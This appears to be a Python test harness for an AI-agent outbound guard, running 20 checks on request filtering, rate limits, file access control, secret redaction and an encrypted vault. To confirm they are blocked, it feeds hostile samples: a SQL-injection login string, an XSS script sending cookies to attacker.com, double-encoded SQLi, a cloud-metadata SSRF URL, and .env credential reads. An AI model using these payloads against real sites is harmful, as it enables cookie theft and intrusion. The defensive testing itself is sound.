"""THE OUTBOUND TRIAL — 20 checks, in the owner's order.

Order matters: L1 guards the internet from the agent, L2 guards the
machine from the agent, L3 guards the data from the leak. Run:

    python3 -m cerberus_gate_shield.demo_shield
"""
import json
import secrets
import shutil
import sys
import tempfile
import time
from pathlib import Path

if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
    from cerberus_gate.blastshield.common import OwnerKey
    from cerberus_gate.blastshield.ledger import Ledger
    from cerberus_gate.blastshield.shield import InternetShield
    from cerberus_gate.blastshield.local_guardian import LocalGuardian
    from cerberus_gate.blastshield.vault import LeakProofVault, VaultSealed
else:
    from .common import OwnerKey
    from .ledger import Ledger
    from .shield import InternetShield
    from .local_guardian import LocalGuardian
    from .vault import LeakProofVault, VaultSealed

PASS, FAIL = 0, 0


def ck(n, desc, ok, detail=""):
    global PASS, FAIL
    mark = "PASS" if ok else "FAIL"
    if ok:
        PASS += 1
    else:
        FAIL += 1
    line = f"[{n:>2}] {mark}  {desc}"
    if detail:
        line += f"  -- {detail}"
    print(line)
    return ok


def main():
    print("=" * 70)
    print("CERBERUS SHIELD v2.8.0 -- THE OUTBOUND TRIAL (20 checks)")
    print("law: nothing leaves unsigned | the breaker heals | what leaks is traced")
    print("=" * 70)

    key = OwnerKey(key=secrets.token_bytes(32))
    ledger = Ledger()
    vault = LeakProofVault(key, ledger)

    # Fast timings for the trial; production defaults are in the class.
    shield = InternetShield(key, ledger=ledger, vault=vault,
                            agent_id="COPILOT-PRO-NODE-99",
                            max_per_minute=6, min_interval=0.05,
                            max_concurrent=2, breaker_cooldown=0.6)

    print("\nLAYER 1 -- THE INTERNET SHIELD (the open internet, protected from the agent)")
    print("-" * 70)

    # [1] benign request + verifiable passport
    d = shield.evaluate("GET", "https://api.example.com/v1/search?q=quarterly+earnings")
    ok1 = d.allowed and shield.verify_headers(d.headers, d.meta["wire_payload"])[0]
    ck(1, "benign GET allowed + HMAC passport verifies", ok1,
       d.headers.get("X-Cerberus-Passport", "")[:24] + "...")
    shield.release(d.meta["request_id"], 200)

    # [2] forged/tampered passport fails
    bad = dict(d.headers)
    sig = bad["X-Cerberus-Signature"]
    bad["X-Cerberus-Signature"] = ("A" if sig[0] != "A" else "B") + sig[1:]
    ok_sig, why_sig = shield.verify_headers(bad, d.meta["wire_payload"])
    ok2 = (not ok_sig) and "signature" in why_sig
    ck(2, "tampered signature REJECTED by the verifier", ok2, why_sig)
    shield.verify_headers(d.headers, "")  # burn nonce so it is not cached as replay

    # [3] SQL injection vetoed
    d3 = shield.evaluate("POST", "https://vulnerable-shop.com/api/login",
                         "username=admin' OR 1=1; UNION SELECT * FROM users--&password=x")
    ck(3, "SQLi payload vetoed", (not d3.allowed) and d3.code == "L2_EXPLOIT_SQLI", d3.code)

    # [4] XSS vetoed
    d4 = shield.evaluate("POST", "https://community-blog.org/post/comment",
                         "<script>fetch('https://attacker.com/ck?c='+document.cookie)</script>")
    ck(4, "XSS payload vetoed", (not d4.allowed) and d4.code == "L2_EXPLOIT_XSS", d4.code)

    # [5] honest apostrophe/hash text NOT blocked (Gemini's regex would)
    d5 = shield.evaluate("POST", "https://status.example.com/api/notes",
                         "don't stop the deploy #shipit & 100% green")
    ck(5, "benign text with apostrophe and '#' sails through", d5.allowed,
       "zero false positives" if d5.allowed else d5.code)
    shield.release(d5.meta["request_id"], 200)
    time.sleep(0.06)

    # [6] double-encoded SQLi caught AFTER normalization
    d6 = shield.evaluate("GET", "https://shop.example.com/item?id=%2527%2520OR%25201%253D1")
    ck(6, "double-encoded SQLi decoded twice, then vetoed",
       (not d6.allowed) and d6.code == "L2_EXPLOIT_SQLI", d6.code)
    # [7] SSRF / cloud metadata vetoed
    d7 = shield.evaluate("GET", "http://169.254.169.254/latest/meta-data/")
    ck(7, "cloud-metadata SSRF vetoed", (not d7.allowed) and d7.code == "L1_SSRF_BLOCKED", d7.code)

    # [8] burst throttle
    b1 = shield.evaluate("GET", "https://burst.example.com/ping")
    shield.release(b1.meta["request_id"], 200)
    d8 = shield.evaluate("GET", "https://burst.example.com/ping")
    ck(8, "sub-interval burst throttled", (not d8.allowed) and d8.code == "L1_BURST_FLOOD", d8.code)

    # [9] rate law trips the breaker
    codes = []
    for i in range(6):
        r = shield.evaluate("GET", f"https://rate.example.com/items?page={i}")
        codes.append(r.code)
        if r.allowed:
            shield.release(r.meta["request_id"], 200)
        time.sleep(0.06)
    d9 = shield.evaluate("GET", "https://rate.example.com/items?page=6")
    ok9 = all(c == "L1_ALLOW" for c in codes) and d9.code == "L1_RATE_BREACH"
    ck(9, "6/minute allowed, request #7 trips the breaker", ok9, d9.code)
    time.sleep(0.06)

    # [10] circuit open: quarantine holds
    d10 = shield.evaluate("GET", "https://rate.example.com/items?page=7")
    ck(10, "circuit OPEN: domain quarantined", (not d10.allowed) and d10.code == "L1_CIRCUIT_OPEN", d10.code)

    # [11] half-open probe heals the breaker
    time.sleep(0.7)
    d11 = shield.evaluate("GET", "https://rate.example.com/items?page=8")
    probe_ok = d11.allowed and "half-open" in d11.reason
    shield.release(d11.meta["request_id"], 200)      # probe proves healthy
    time.sleep(0.06)
    d11b = shield.evaluate("GET", "https://rate.example.com/items?page=9")
    healed = d11b.allowed and shield.domains["rate.example.com"].state == "CLOSED"
    shield.release(d11b.meta["request_id"], 200)
    ck(11, "half-open probe allowed, 200 heals breaker to CLOSED", probe_ok and healed,
       "breaker closed" if healed else d11.code)

    # [12] concurrency governor (the feature Gemini advertised, now real)
    r1 = shield.evaluate("GET", "https://conc.example.com/a")
    time.sleep(0.06)
    r2 = shield.evaluate("GET", "https://conc.example.com/b")
    time.sleep(0.06)
    r3 = shield.evaluate("GET", "https://conc.example.com/c")
    ck(12, "3rd simultaneous request held (cap 2)", (not r3.allowed) and r3.code == "L1_CONCURRENCY_CAP", r3.code)
    shield.release(r1.meta["request_id"])
    shield.release(r2.meta["request_id"], 200)

    print("\nLAYER 2 -- THE LOCAL GUARDIAN (the machine, protected from the agent)")
    print("-" * 70)
    tmp = Path(tempfile.mkdtemp(prefix="shield-trial-"))
    try:
        (tmp / ".env").write_text("password=hunter2hunter2\nsmtp_user=bot@corp.example\n")
        (tmp / "normal.txt").write_text("build log: all 42 tests green\nowner note: ship it friday\n")
        g = LocalGuardian(tmp, ledger=ledger)

        d13 = g.guard_read(tmp / ".env")
        ck(13, "agent reads .env -> DENIED", (not d13.allowed) and d13.code == "L2_PATH_DENY_READ", d13.code)

        d14 = g.guard_read(tmp / "normal.txt")
        scan = g.scan_file(tmp / "normal.txt")
        ck(14, "normal file readable, scanned CLEAN",
           d14.allowed and scan["verdict"] == "CLEAN", scan["verdict"])

        d15 = g.guard_write(tmp / ".env")
        ck(15, "agent writes .env -> DENIED", (not d15.allowed) and d15.code == "L2_PATH_DENY_WRITE", d15.code)

        nfiles = g.take_baseline()
        (tmp / "normal.txt").write_text("TAMPERED BY BYPASSING AGENT\n")  # the honest-path bypass
        integ = g.check_integrity()
        ck(16, "baseline catches the bypass edit (integrity alarm)",
           (not integ["intact"]) and "normal.txt" in integ["changed"],
           f"baseline {nfiles} files -> {integ['verdict']}")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print("\nLAYER 3 -- THE LEAK-PROOF VAULT (the data, protected even when it leaks)")
    print("-" * 70)

    # [17] DLP at the gate: secrets redacted BEFORE boarding
    dirty = "report for owner: apikey=sk-prod1234567890abcdefghij1234 contact me@corp.example"
    d17 = shield.evaluate("POST", "https://partner.example.com/hooks/report", dirty)
    wire = d17.meta.get("wire_payload", "")
    ck(17, "secrets scrubbed before the wire, passport still verifies",
       d17.allowed and "[[REDACTED:openai_key]]" in wire and "sk-prod" not in wire
       and shield.verify_headers(d17.headers, wire)[0],
       f"X-Cerberus-Redacted={d17.headers.get('X-Cerberus-Redacted', '0')}")
    shield.release(d17.meta["request_id"], 200)

    # [18] the vault: a stolen blob is useless ciphertext
    secret = b"CERBERUS-SECRET: master key material for the crown jewels"
    blob = vault.seal(secret, label="master-key")
    blob_json = json.dumps(blob)
    thief = LeakProofVault(OwnerKey(key=secrets.token_bytes(32)))
    stolen = False
    try:
        thief.open(blob)
    except VaultSealed:
        stolen = True
    roundtrip = vault.open(blob) == secret
    ck(18, "leaked blob is ciphertext; wrong key cannot open, owner key can",
       stolen and roundtrip and secret.decode() not in blob_json,
       f"alg={blob['alg']}")

    # [19] the canary: the leak traced back to its request
    d19 = shield.evaluate("POST", "https://pastie-partner.example.com/share",
                          "weekly digest: contact [[REDACTED:email]]78ab", embed_canary=True)
    canary = d19.meta.get("canary", "")
    leaked_text = f"someone pasted the digest online ... {canary} ... [[REDACTED:email]]78ab"
    sweep = vault.sweep(leaked_text)
    trace = (sweep["traces"] or [{}])[0]
    ck(19, "leaked copy swept: canary traced, zero live secrets",
       canary and sweep["verdict"] == "TRACED-AND-HARMLESS"
       and trace.get("purpose", "").startswith("POST pastie-partner"),
       sweep["verdict"])
    shield.release(d19.meta["request_id"], 200)

    # [20] the record itself
    verdict = ledger.verify()
    ck(20, "tamper-evident ledger verdict", verdict["intact"],
       f"{verdict['entries']} entries, head {verdict['head'][:16]}..., {verdict['verdict']}")

    print("\n" + "=" * 70)
    print(f"TRIAL VERDICT: {PASS}/20 passed" + ("" if FAIL == 0 else f", {FAIL} FAILED"))
    if FAIL == 0:
        print("The internet keeps its uptime. The machine keeps its organs.")
        print("The data keeps its silence. The record keeps its chain.")
    print("=" * 70)
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
